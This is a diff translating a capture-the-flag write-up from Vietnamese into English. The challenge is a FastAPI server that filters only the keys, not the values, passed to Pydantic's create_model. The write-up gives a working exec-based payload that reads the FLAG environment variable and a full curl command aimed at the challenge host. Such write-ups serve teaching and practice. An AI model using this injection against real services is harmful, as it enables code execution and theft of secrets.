@@ -47,48 +47,48 @@ def register_item(name: str, item: str = Body()):
     return "Item successfully registered"
 ```
 
-### Phân tích
+### Analysis
 
-Server lưu dữ liệu trong 2 biến global:
+The server stores data in 2 global variables:
 
 ```python
 blueprints = {}
 items = {}
 ```
 
-Endpoint `/blueprint/{name}` cho phép người dùng gửi JSON để tạo một model Pydantic động bằng `create_model()`:
+The `/blueprint/{name}` endpoint lets the user send JSON to dynamically create a Pydantic model via `create_model()`:
 
 ```python
 Blueprint = create_model(name, **description)
 ```
 
-Trước khi tạo model, server chỉ filter những field có key bắt đầu bằng `__`:
+Before creating the model, the server only filters fields whose key starts with `__`:
 
 ```python
 description = {k: v for k,v in description.items() if not k.startswith("__")}
 ```
 
-Ta thấy server chỉ kiểm tra **key**, nhưng lại không kiểm tra **value**.
+We see the server only checks the **key**, but does not check the **value**.
 
-Vì vậy ta có thể lợi dụng value để thực thi Python expression. Mục tiêu là đọc biến môi trường `FLAG`, sau đó ghi flag vào biến global `items` để có thể lấy lại qua endpoint:
+So we can abuse the value to execute a Python expression. The goal is to read the `FLAG` environment variable, then write the flag into the global variable `items` so we can retrieve it via the endpoint:
 
 ```http
 GET /item/flag
 ```
 
-### Ý tưởng payload:
+### Payload idea:
 
 ```python
 items['flag'] = os.environ['FLAG']
 ```
 
-Do expression cần trả về một type hợp lệ cho field, ta dùng tuple expression:
+Since the expression needs to return a valid type for the field, we use a tuple expression:
 
 ```python
 (__import__('builtins').exec("items['flag']=__import__('os').environ['FLAG']"), str)[1]
 ```
 
-### Khai thác
+### Exploitation
 
 ```bash
 BASE='https://boiled-tofu-with-minced-aioli-zlg3.gpn24.ctf.kitctf.de'
@@ -98,15 +98,15 @@ curl -s -X POST "$BASE/blueprint/hai" \
   --data '{"x":"(__import__('"'"'builtins'"'"').exec(\"items['"'"'flag'"'"']=__import__('"'"'os'"'"').environ['"'"'FLAG'"'"']\"), str)[1]"}'
 ```
 
-Server trả về:
+The server returns:
 
 ```text
 "Blueprint successfully registered"
 ```
 
-Lúc này payload đã được thực thi và flag đã bị ghi vào `items['flag']`.
+At this point the payload has been executed and the flag has been written into `items['flag']`.
 
-Đọc flag bằng endpoint `/item/flag`:
+Read the flag via the `/item/flag` endpoint:
 
 ![](./image-1.png)
 
